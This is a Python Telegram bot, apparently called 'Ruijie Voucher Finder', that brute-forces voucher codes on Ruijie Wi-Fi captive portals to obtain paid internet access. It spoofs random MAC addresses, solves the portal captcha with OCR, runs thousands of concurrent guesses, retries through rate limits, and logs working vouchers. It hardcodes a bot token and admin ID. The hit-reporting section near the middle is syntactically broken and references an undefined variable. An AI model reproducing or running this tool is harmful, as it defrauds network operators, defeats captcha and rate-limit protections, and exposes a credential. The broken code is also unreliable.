# -*- coding: utf-8 -*-
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2, ddddocr, numpy as np
from collections import deque
from urllib.parse import urlparse, parse_qs

BOT_TOKEN = "8633805405:AAFsRDgoN318QtoBfa7FMT0D2cvHt0hnP3I"
ADMIN_ID = "728927470"

CONCURRENCY = 5000          
BATCH_SIZE = 500          
TIMEOUT = 50               

_last_checks = deque()

async def limit_speed():
    now = time.time()
    while _last_checks and now - _last_checks[0] > 60:
        _last_checks.popleft()
    if len(_last_checks) >= 30000:
        await asyncio.sleep(60 - (now - _last_checks[0]) + 0.1)
    _last_checks.append(time.time())

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
success_messages = {}
limited_messages = {}
retry_counts = {}

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)

STATE_FILE = "state.json"
HITS_FILE = "hits.json"

def save_state():
    try:
        payload = {"user_data": {str(k): v for k, v in user_data.items()}}
        with open(STATE_FILE, "w") as f:
            json.dump(payload, f)
    except Exception as e:
        print(f"[save_state] {e}")

def load_state():
    global user_data
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
    except Exception as e:
        print(f"[load_state] {e}")

def save_hits():
    try:
        with open(HITS_FILE, "w") as f:
            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
    except Exception as e:
        print(f"[save_hits] {e}")

def load_hits():
    try:
        if not os.path.exists(HITS_FILE):
            return
        with open(HITS_FILE) as f:
            payload = json.load(f)
        for k, v in payload.items():
            try:
                success_texts[int(k)] = v
            except ValueError:
                continue
    except Exception as e:
        print(f"[load_hits] {e}")

_web_start = time.time()

async def handle(request):
    up = int(time.time() - _web_start)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    return web.json_response({
        "status": "ok",
        "bot": "Ruijie Voucher Bot",
        "uptime": f"{h}h {m}m {s}s"
    })

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ping", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(" 🔌/input", callback_data="menu_input"),
        InlineKeyboardButton("🔍 /scan (ခလုတ်နှိပ်ရန်)", callback_data="menu_scan"),
        InlineKeyboardButton("♻️ /recheck", callback_data="menu_recheck"),
        InlineKeyboardButton(" 💾/saved", callback_data="menu_saved"),
        InlineKeyboardButton("⛔ /stop", callback_data="menu_stop"),
        InlineKeyboardButton("📝 /status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-digit (000000-999999)", callback_data="scan_6"),
        InlineKeyboardButton("7-digit", callback_data="scan_7"),
        InlineKeyboardButton("8-digit", callback_data="scan_8"),
        InlineKeyboardButton("A-Z (Upper)", callback_data="scan_upper"),
        InlineKeyboardButton("a-z (Lower)", callback_data="scan_ascii"),
        InlineKeyboardButton("Az34 (Mix)", callback_data="scan_mix"),
        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return markup

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def check_session_url(session_url):
    try:
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

async def get_session_id(sess, session_url, previous_session_id=None):
    if "sign=" in session_url:
        url = session_url
    else:
        mac = get_mac()
        url = replace_mac(session_url, new_mac=mac)

    parsed = urlparse(session_url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            final_url = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9_\-]+)", final_url)
            if sid:
                return sid.group(1)
            body_text = await req.text()
            sid_body = re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_\-]+)['\"]", body_text)
            if sid_body:
                return sid_body.group(1)
            for cookie in sess.cookie_jar:
                if cookie.key.lower() in ['sessionid', 'sid'] and cookie.value:
                    return cookie.value
            return previous_session_id
    except:
        return previous_session_id

def _ocr_process(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", thr)
        return _ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def parse_captcha_text(img_bytes):
    return await asyncio.to_thread(_ocr_process, img_bytes)

async def fetch_captcha_img(sess, session_url, session_id):
    parsed = urlparse(session_url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"
    headers = {
        'authority': parsed.netloc,
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'referer': f'{base_domain}/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with sess.get(f'{base_domain}/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def verify_captcha(sess, session_url, session_id, text):
    parsed = urlparse(session_url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"
    headers = {
        'authority': parsed.netloc,
        'content-type': 'application/json',
        'origin': base_domain,
        'referer': f'{base_domain}/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with sess.post(f'{base_domain}/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") else None

def iter_codes(mode, prefix=""):
    prefix = prefix.strip()
    if mode in ["6", "7"]:
        length = int(mode)
        max_val = 10 ** length
        direction = random.choice([True, False])
        if direction:
            codes = [prefix + str(i).zfill(length) for i in range(max_val)]
        else:
            codes = [prefix + str(i).zfill(length) for i in range(max_val - 1, -1, -1)]
        yield from codes
        return

    if mode == "upper":
        import itertools
        for item in itertools.product(string.ascii_uppercase, repeat=6):
            yield prefix + "".join(item)
        return

    if mode == "ascii-lower":
        import itertools
        for item in itertools.product(string.ascii_lowercase, repeat=6):
            yield prefix + "".join(item)
        return

    if mode == "mix":
        chars = string.ascii_letters + string.digits
        while True:
            yield prefix + "".join(random.choice(chars) for _ in range(6))
    
    if mode == "8":
        while True:
            yield prefix + "".join(random.choice(string.digits) for _ in range(8))

    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield prefix + "".join(random.choice(chars) for _ in range(6))
            
    raise ValueError(f"Invalid mode: {mode}")

def format_minutes(total_minutes):
    if not total_minutes or total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        h, m = divmod(mins, 60)
        if h > 0 and m > 0:
            return f"{h}h {m}m"
        return f"{h}h" if h > 0 else f"{m}m"
    except:
        return 'Unknown'

async def get_expiry_info(session_id, session_url):
    try:
        parsed = urlparse(session_url)
        base_domain = f"{parsed.scheme}://{parsed.netloc}"
    except:
        base_domain = "https://portal-as.ruijienetworks.com"

    headers = {
        'authority': urlparse(base_domain).netloc,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json',
        'referer': f'{base_domain}/download/static/maccauth/src/balance.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=10)
        ) as fresh_session:
            async with fresh_session.get(
                f'{base_domain}/api/macc2/balance/getBalance/{session_id}', headers=headers
            ) as req:
                res = await req.json()
                result = res.get('result', {})
                profile = result.get('profileName') or result.get('packageName') or 'Unknown'
                total_mins = result.get('totalMinutes') or result.get('totalTime') or result.get('remainTime')
                duration = format_minutes(total_mins)
                expire_date = result.get('expireTime') or result.get('expiredTime') or result.get('validityPeriod')
                
                info_parts = [f"💌 Plan: {profile}"]
                info_parts.append(f"⏰ Time: {duration}")
                if expire_date:
                    info_parts.append(f"📅 Expire: {expire_date}")
                return " | ".join(info_parts)
    except:
        return "💌 Plan: Unknown | ⏰ Time: Unknown"

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_len = 20
        pct = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_len, int(pct / 5))
        bar = "█" * filled + "░" * (bar_len - filled)
        return (
            f"🔍 Scanning Codes...\n\n"
            f"📃 Checked : {checked:,}/{total:,}\n"
            f"📊 Progress : {pct:.2f}%\n"
            f"⚡ Speed : {speed_str}\n"
            f"✅ Found : {found}\n"
            f"🔁 Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍 Scanning Codes...\n\n"
        f"📃 Checked : {checked:,}\n"
        f"⚡ Speed : {speed_str}\n"
        f"✅ Found : {found}\n"
        f"🔁 Retry : {retries}\n"
        f"📊 Status : running\n"
    )

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
    await limit_speed()
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    parsed = urlparse(session_url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"
    voucher_url = f"{base_domain}/api/auth/voucher/?lang=en_US"

    response = None
    session_id = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(5):
                try:
                    img = await fetch_captcha_img(task_session, session_url, session_id)
                    text = await parse_captcha_text(img)
                    if not text or len(text) < 4:
                        continue
                    if await verify_captcha(task_session, session_url, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": str(code),
                "sessionId": str(session_id),
                "apiVersion": 1,
                "authCode": str(auth_code),
            }
            headers = {
                "authority": parsed.netloc,
                "content-type": "application/json",
                "origin": base_domain,
                "referer": f"{base_domain}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(voucher_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                continue

        if response and ('request limited' in response or '频繁' in response):
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(2)
            continue
        break

    if not response:
        return

    if any(k in response for k in ['logonUrl', 'success":true', 'success": true', 'authSuccess', 'redirectUrl']):
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
            
        expire_info = await get_expiry_info(session_id, session_url) if session_id else "☠️ Plan: Unknown | ⏳ Time: Unknown"
        hit_entry = f"💌 {code}\n   {expire_info}"
        
        if hit_entry not in success_texts[chat_id]:
            success_texts[chat_id].append(hit_entry)
            save_hits()
            try:
                from datetime import datetime

# လက်ရှိအချိန်ကို ရယူရန် (လိုအပ်သလို ပုံစံထုတ်နိုင်ပါတယ်)
current_time = datetime.now().strftime("%I:%M %p")  # ဥပမာ - 05:02 AM

# မက်ဆေ့ခ်ျတည်ဆောက်ပုံ
message_text = f"🔨 HIT FOUND!\n\n💌 {code}\n💌 Plan: {plan} | ⏰ Time: {current_time}"
await bot.send_message(chat_id, message_text)



    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_info = await get_expiry_info(session_id, session_url) if session_id else "☠️ Plan: Unknown"
        limited_entry = f"⚠️ {code}\n   {expire_info}"
        if limited_entry not in limited_texts[chat_id]:
            limited_texts[chat_id].append(limited_entry)

async def run_bruteforce(mode, prefix, chat_id, session_url, scan_id, progress_msg=None):
    try:
        code_iter = iter_codes(mode, prefix)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = (10 ** int(mode)) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c, chat_id, scan_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            
            if progress_msg:
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, reply_markup=main_menu())
                except:
                    pass

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            finish_text = (
                f"✅ Scanning Completed!\n\n"
                f"📃 Checked : {checked:,}\n"
                f"💠 Found : {final_found}\n"
                f"📊 Progress : 100%\n"
                f"[████████████████████]"
            )
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, reply_markup=main_menu())
            except:
                await bot.send_message(chat_id, finish_text, reply_markup=main_menu())
    finally:
        scan_tasks.pop(chat_id, None)

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(
        message,
        "💠 Ruijie Voucher Finder\n\n"
        "Commands:\n"
        "/input [url] - Set Session URL\n"
        "/scan - Start scan menu\n"
        "/saved - Show found codes\n"
        "/stop - Stop scan\n"
        "/recheck - Recheck codes\n"
        "/status - Bot status",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=['menu'])
async def menu_command(message):
    await bot.reply_to(message, "⚙️ Main Menu", reply_markup=main_menu())

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input <session_url>", reply_markup=main_menu())
        return
    url = args[1]
    chat_id = message.chat.id
    await bot.reply_to(message, "🔄 Checking session URL...")
    if await check_session_url(url):
        user_data.setdefault(chat_id, {})
        user_data[chat_id]['session_url'] = url
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        save_state()
        await bot.send_message(chat_id, "✅ Session URL saved!\nUse /scan to start.", reply_markup=main_menu())
    else:
        await bot.send_message(chat_id, "❌ Invalid Session URL.", reply_markup=main_menu())

@bot.message_handler(commands=['scan'])
async def scan_command(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Set Session URL first using /input", reply_markup=main_menu())
        return
    await bot.reply_to(message, "⚙️ **Select Scan Mode (ခလုတ်နှိပ်၍ စတင်ပါ):**", parse_mode="Markdown", reply_markup=scan_mode_menu())

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        await bot.reply_to(message, "🛑 Scan stopped.", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "No active scan running.", reply_markup=main_menu())

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "❌ No codes saved yet.", reply_markup=main_menu())
        return
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        parts.extend(success[:30])
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited[:20])
    await bot.send_message(chat_id, "\n\n".join(parts), parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Set Session URL first using /input", reply_markup=main_menu())
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "No valid codes to recheck.", reply_markup=main_menu())
        return
    await bot.reply_to(message, "🔄 Rechecking saved codes...")
    new_success = []
    for item in success:
        code = item.split("💌 ")[1].split("\n")[0] if "🧩 " in item else item
        recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True)
        if recode:
            new_success.append(item)
    if new_success:
        success_texts[chat_id] = new_success
        save_hits()
        await bot.reply_to(message, f"✅ {len(new_success)} codes still valid.", reply_markup=main_menu())
    else:
        success_texts[chat_id] = []
        save_hits()
        await bot.reply_to(message, "No valid codes found after recheck.", reply_markup=main_menu())

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "Access Denied.", reply_markup=main_menu())
        return
    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up_secs = int(time.monotonic() - _start_time)
    h, r = divmod(up_secs, 3600)
    m, s = divmod(r, 60)
    total_found = sum(len(v) for v in success_texts.values())
    await bot.reply_to(
        message,
        f"💓 **Bot Status**\n\n"
        f"❤️ Uptime: {h}h {m}m {s}s\n"
        f"💛 Active Scans: {active_scans}\n"
        f"🤍 Users: {len(user_data)}\n"
        f"💟 Total Found: {total_found}\n",
        parse_mode="Markdown", reply_markup=main_menu()
    )

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if call.data == "menu_back":
        await bot.edit_message_text("⚙️ Main Menu", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("Send your Session URL like: /input <url>", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.answer_callback_query(call.id, "❌ Please set Session URL first using /input", show_alert=True)
            return
        await bot.edit_message_text("🔍 **Select Scan Mode (ခလုတ်နှိပ်၍ စတင်ပါ):**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.answer_callback_query(call.id, "❌ Please set Session URL first using /input", show_alert=True)
            return

        mode_map = {
            "scan_6": "6", 
            "scan_7": "7", 
            "scan_8": "8", 
            "scan_upper": "upper", 
            "scan_ascii": "ascii-lower", 
            "scan_mix": "mix", 
            "scan_all": "all"
        }
        mode = mode_map.get(call.data, "6")

        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.answer_callback_query(call.id, "Scan already running. Use /stop first.", show_alert=True)
            return

        await bot.edit_message_text(f"🔍 Starting scan... Mode: {mode}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(
            run_bruteforce(mode, "", chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg=call.message)
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await call.answer()
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text("🔄 Rechecking...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        fake_msg = type('obj', (object,), {'chat': type('obj', (object,), {'id': chat_id})()})()
        await recheck(fake_msg)
        await call.answer()
        return

    if call.data == "menu_saved":
        await bot.edit_message_text("💌 Saved Codes", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        fake_msg = type('obj', (object,), {'chat': type('obj', (object,), {'id': chat_id})()})()
        await saved_codes(fake_msg)
        await call.answer()
        return

    if call.data == "menu_stop":
        await bot.edit_message_text("⏹ Stopping scan...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        fake_msg = type('obj', (object,), {'chat': type('obj', (object,), {'id': chat_id})()})()
        await stop_scan(fake_msg)
        await call.answer()
        return

    if call.data == "menu_status":
        await bot.edit_message_text("📊 Bot Status", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        fake_msg = type('obj', (object,), {'chat': type('obj', (object,), {'id': chat_id})()})()
        await status(fake_msg)
        await call.answer()
        return

    if call.data == "menu_help":
        help_text = (
            "⁉️ **Help & Guide**\n\n"
            "/start - Show main menu\n"
            "/input [url] - Set Session URL\n"
            "/scan - Open scan menu buttons\n"
            "/saved - View saved codes\n"
            "/stop - Stop running scan\n"
            "/recheck - Recheck codes\n"
            "/status - Bot status"
        )
        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

@bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
async def smart_input(message):
    text = message.text.strip()
    chat_id = message.chat.id
    if text.startswith("http") and ("ruijienetworks.com" in text or "portal" in text.lower()):
        if await check_session_url(text):
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            save_state()
            await bot.send_message(chat_id, "✅ Session URL saved! Click /scan or menu to start.", reply_markup=main_menu())
        else:
            await bot.send_message(chat_id, "❌ Invalid Session URL.", reply_markup=main_menu())
        return
    await bot.send_message(chat_id, "Send your Session URL to start.", reply_markup=main_menu())

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except Exception as e:
            print(f"[polling] reconnecting in {backoff}s... error: {e}")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        load_state()
        load_hits()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
